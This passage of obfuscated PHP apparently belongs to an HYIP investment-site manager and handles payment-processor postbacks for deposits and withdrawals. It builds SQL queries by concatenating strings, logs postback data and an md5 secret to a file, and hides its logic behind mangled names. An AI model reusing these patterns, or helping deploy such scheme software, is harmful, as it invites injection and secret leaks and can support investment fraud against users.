      $elnlcTcyic[$elnlchyuw['elnlcrihr']] = $elnlchyuw['elnlcAflg'];
      $elnlcTcyic[$elnlchyuw['elnlcfSQvD']] = $elnlchyuw['elnlcoPee'];
    }
    else
    {
      $elnlcbzJNF = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $elnlcTcyic[$elnlchyuw['elnlcrihr']] = '$';
      $elnlcTcyic[$elnlchyuw['elnlcfSQvD']] = $elnlchyuw['elnlchcRPc'];
      $elnlcTcyic[$elnlchyuw['elnlcURWy']] = $elnlchyuw['elnlcLsUA'];
      $elnlcTcyic[$elnlchyuw['elnlcyhPRM']] = $elnlchyuw['elnlcKIfg'];
    }
  }

  $elnlcTcyic[$elnlchyuw['elnlcPMVkt']] = $elnlchyuw['elnlchcRPc'];
  if ((($elnlcTcyic[$elnlchyuw['elnlcVluL']] AND !$elnlcTcyic[$elnlchyuw['elnlcCStF']]) AND !$elnlcTcyic[$elnlchyuw['elnlcbTUFp']]))
  {
    $elnlcTcyic[$elnlchyuw['elnlcbTUFp']] = $elnlchyuw['elnlchcRPc'];
  }

  if ($elnlcTcyic[$elnlchyuw['elnlcCStF']])
  {
    $elnlcTcyic[$elnlchyuw['elnlcsGGg']] = $elnlcTcyic[$elnlchyuw['elnlcVluL']];
  }
  else
  {
    $elnlcTcyic[$elnlchyuw['elnlcsGGg']] = '';
  }

  if ($elnlcTcyic[$elnlchyuw['elnlcbTUFp']])
  {
    $elnlcTcyic[$elnlchyuw['elnlcmcqCy']] = $elnlcTcyic[$elnlchyuw['elnlcVluL']];
  }
  else
  {
    $elnlcTcyic[$elnlchyuw['elnlcmcqCy']] = '';
  }

  foreach ($elnlcbzJNF as $elnlcluDIv => $elnlcxIcB)
  {
    if (($elnlcTcyic['def_payee_account_' . $elnlcxIcB['sfx']] != '' AND $elnlcTcyic['def_payee_account_' . $elnlcxIcB['sfx']] != '0'))
    {
      $elnlcbzJNF[$elnlcluDIv][$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlchcRPc'];
      continue;
    }
    else
    {
      $elnlcbzJNF[$elnlcluDIv][$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcRjwtU'];
      continue;
    }
  }

  if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlczrWy'])
  {
    $elnlcjzOa = array (1 => 'english', 2 => 'estonians', 3 => $elnlchyuw['elnlcliDn']);
  }

  if (($elnlcTcyic[$elnlchyuw['elnlcklHl']] != 'RHLFPPEURGQGG68GXYA8' AND $elnlcTcyic[$elnlchyuw['elnlcklHl']] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $elnlcTcyic[$elnlchyuw['elnlcUTsFV']] = $elnlchyuw['elnlcRjwtU'];
  }

  if (($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcGSyEs'] OR $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcCckss']))
  {
    $elnlcTcyic[$elnlchyuw['elnlcLcBH']] = $elnlchyuw['elnlchcRPc'];
  }

  if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcPfPG'])
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcSRgTn'] OR $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcjDQN']) OR $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcDzEe']) OR $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlctIyeC']) OR $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlclLDR']) OR $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcEaOt']))
  {
    if ($elnlcVWtlw[$elnlchyuw['elnlcbMpD']] != '')
    {
      $elnlcVWtlw[$elnlchyuw['elnlchRCfi']] = $elnlcVWtlw[$elnlchyuw['elnlcbMpD']];
      $_SERVER[$elnlchyuw['elnlchRCfi']] = $elnlcVWtlw[$elnlchyuw['elnlcbMpD']];
    }
  }

  $elnlcwOsEv = elnlciuvj ();
  if (!$elnlcwOsEv)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  if (file_exists ('./tmpl_c/log_postbacks'))
  {
    $elnlcNrVL = fopen ($elnlchyuw['elnlcsfwt'], $elnlchyuw['elnlcGEkD']);
    foreach ($elnlcCMAtx as $k => $v)
    {
      fwrite ($elnlcNrVL, ('' . $k . ' => ' . $v . '
'));
    }

    foreach ($elnlcVWtlw as $k => $v)
    {
      fwrite ($elnlcNrVL, ('' . $k . ' => ' . $v . '
'));
    }

    fwrite ($elnlcNrVL, ('' . 'md5 = ' . $elnlcTcyic[$elnlchyuw['elnlcubMyG']] . '
'));
    fwrite ($elnlcNrVL, '--------------------------------
');
    fclose ($elnlcNrVL);
  }

  $elnlczxLvr = $elnlcTcyic[$elnlchyuw['elnlcubMyG']];
  if ($elnlcCMAtx[$elnlchyuw['elnlcjCub']] == $elnlchyuw['elnlcRofAW'])
  {
    $elnlcdiuI = 'n/a';
    list ($elnlcluDIv, $elnlckvRWp) = explode ('-', $elnlcCMAtx[$elnlchyuw['elnlcBBQCk']]);
    $elnlcluDIv = sprintf ('%d', $elnlcluDIv);
    if ($elnlckvRWp == '')
    {
      $elnlckvRWp = $elnlchyuw['elnlctxvE'];
    }

    $elnlckvRWp = elnlcekjci ($elnlckvRWp);
    $q = '' . 'select * from hm2_history where id = ' . $elnlcluDIv . ' and str = \'' . $elnlckvRWp . '\' and type=\'withdraw_pending\'';
    $elnlcTpvVW = mysql_query ($q);
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlcluDIv;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
	amount = -' . abs ($elnlcgVDB[$elnlchyuw['elnlcGsrCm']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcdiuI . '\',
	actual_amount = -') . abs ($elnlcgVDB[$elnlchyuw['elnlcGsrCm']]) . ',
	ec = 11,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']];
      $elnlcTpvVW = mysql_query ($q);
      $elnlcMOQN = mysql_fetch_array ($elnlcTpvVW);
      $elnlcfOud = array ();
      $elnlcfOud[$elnlchyuw['elnlcEzHQ']] = $elnlcMOQN[$elnlchyuw['elnlcEzHQ']];
      $elnlcfOud[$elnlchyuw['elnlcvbiD']] = $elnlcMOQN[$elnlchyuw['elnlcvbiD']];
      $elnlcfOud[$elnlchyuw['elnlcGsrCm']] = sprintf ('%.02f', abs ($elnlcgVDB[$elnlchyuw['elnlcGsrCm']]));
      $elnlcfOud[$elnlchyuw['elnlcVmHJ']] = 'n/a';
      $elnlcfOud[$elnlchyuw['elnlcDPJw']] = $elnlcdiuI;
      $elnlcfOud[$elnlchyuw['elnlcHTla']] = $elnlcdiuI;
      $elnlcfOud[$elnlchyuw['elnlcnEPrV']] = $elnlcdiuI;
      $elnlcfOud[$elnlchyuw['elnlczDWj']] = $elnlcbzJNF[11][$elnlchyuw['elnlcvbiD']];
      elnlcqkpc ('withdraw_user_notification', $elnlcMOQN['email'], $elnlcTcyic[$elnlchyuw['elnlcFUOvO']], $elnlcfOud);
    }

    print 1;
    elnlccryf ($elnlcwOsEv);
    exit ();
  }

  if (((($elnlczxLvr == $elnlcCMAtx[$elnlchyuw['elnlcSEheD']] AND $elnlcCMAtx[$elnlchyuw['elnlcPxmPL']] === 'Success') AND $elnlcCMAtx[$elnlchyuw['elnlcALKQ']] != 1) AND $elnlcbzJNF[11][$elnlchyuw['elnlcMnIrp']] == 1))
  {
    $elnlcJCGAH = sprintf ('%d', $elnlcCMAtx[$elnlchyuw['elnlcmfLWc']]);
    $elnlcHHcr = sprintf ('%d', $elnlcCMAtx[$elnlchyuw['elnlcowFI']]);
    $elnlcyHTK = sprintf ('%d', $elnlcCMAtx[$elnlchyuw['elnlcOcPo']]);
    $elnlcLiht = $elnlcCMAtx[$elnlchyuw['elnlcKFeP']];
    $elnlcdiuI = $elnlcCMAtx[$elnlchyuw['elnlcLcTa']];
    $elnlcqdjux = $elnlcCMAtx[$elnlchyuw['elnlcWBHc']];
    if ((($elnlcCMAtx[$elnlchyuw['elnlcyniy']] == $elnlchyuw['elnlcIwNaa'] AND $elnlcCMAtx[$elnlchyuw['elnlciqjHn']] == $elnlchyuw['elnlcUzOoD']) AND strtolower ($elnlcCMAtx[$elnlchyuw['elnlcfyFc']]) == strtolower ($elnlcTcyic[$elnlchyuw['elnlcFNFW']])))
    {
      elnlcfevr (11, $elnlcJCGAH, $elnlcLiht, $elnlcdiuI, $elnlcqdjux, $elnlcHHcr, $elnlcyHTK);
    }
  }

  elnlccryf ($elnlcwOsEv);
  print '1';
  exit ();
?>